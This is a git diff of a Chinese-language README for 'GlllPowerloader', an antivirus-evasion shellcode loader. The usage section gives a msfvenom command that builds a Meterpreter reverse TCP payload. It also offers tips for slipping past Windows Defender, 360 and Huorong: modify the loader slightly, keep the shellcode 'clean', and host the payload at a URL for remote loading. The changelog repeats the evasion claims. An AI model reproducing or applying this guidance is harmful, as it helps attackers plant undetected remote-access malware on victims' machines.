@@ -1,30 +1,17 @@
 # GlllPowerloader
 
-
+- [GlllPowerloader](#glllpowerloader)
 - [1.前言](#1前言)
-
 - [2.功能](#2功能)
-
 - [3.使用](#3使用)
   - [0x01.环境安装](#0x01环境安装)
-  
   - [0x02.shellcode loader的使用](#0x02shellcode-loader的使用)
-  
-  - [0x03.Automation\_loader](#0x03automation_loader)
-  
-  - [0x04.文件格式转换](#0x04文件格式转换)
-  
-  - [0x05.自动化生成代理DLL](#0x05自动化生成代理dll)
-  
-  - [0x06.文件捆绑和上传](#0x06文件捆绑和上传)
-  
-    
-  
+  - [0x03.视频演示](#0x03视频演示)
 - [4.更新](#4更新)
-
 - [5.免责声明](#5免责声明)
+- [6.致谢](#6致谢)
 
-- [6.结语](#6结语)
+
 
 # 1.前言
 
@@ -66,9 +53,13 @@ start.bat
 
 
 
-## 0x02.shellcode loader的使用
+## 0x02.使用方法
 
-大部分已经不能免杀了，不过稍微改一下基本上都能过，建议使用无阶段的shellcode（Stageless）
+- 大部分已经不能免杀了，不过稍微改一下还是能过主流AV
+- 必须保证你的shellcode是干净的，否则还是会被Windows Defender抓住，您可以学习[Reflective DLL Injection](https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html)和[sRDI](https://github.com/monoxgas/sRDI/tree/master)来自定义shellcode
+- 如果你在使用的过程中被defender查杀了，有可能是您使用的C2工具shellcode内存被抓住了，而不一定是加载器的问题
+- 加载方式采用URL分离加载，所以你需要将shellcode（bin文件）上传或者托管至网站，并且记下URL
+
 
 Metasploit:
 
@@ -76,9 +67,11 @@ Metasploit:
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f raw -o payload.bin
 ```
 
-## 0x03.Automation_loader
 
-必须保证你的shellcode是干净的，否则还是会被Windows Defender抓住
+
+## 0x03.视频演示
+
+
 
 ![示例GIF](https://github.com/INotGreen/GlllPowerloader/blob/main/Image/demo.gif)
 
@@ -88,7 +81,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 [+]2023 年11.15， 删除冗余的功能，优化代码，（之前的版本涉及语言安装环境太多了，使用太麻烦，为了简便就留C/C++的加载器）
 
-[+]2023年11.20，加载方式由本地加载改成URL分离加载，可以免杀defender，360，火绒（前提是shellcode内存是没有被标记的）
+[+]2023年11.20，免杀defender，360，火绒（前提是shellcode内存是没有被标记的）
 
 免杀加载器正在更新中。。。
 
